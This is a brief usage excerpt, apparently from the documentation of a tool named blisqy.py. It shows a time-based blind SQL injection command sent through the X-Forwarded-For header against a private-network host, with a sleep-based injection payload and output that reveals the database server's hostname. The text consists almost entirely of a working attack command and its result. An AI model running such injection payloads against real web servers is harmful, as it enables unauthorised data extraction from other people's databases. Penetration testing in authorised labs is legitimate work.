## Custom Payload:

### Command

```bash
./blisqy.py --server 192.168.56.101 --port 80 --header "X-Forwarded-For" --hvalue "hacker" --sleeptime 0.1  
            --inject "' or if((*sql*),sleep(*time*),0) and '1'='1" --payload "select @@hostname" 
```

### Out-put

```bash
Extracting Data from ====> 192.168.56.101 : 80 
Current Payload : select @@hostname
==================================================================
debian
```
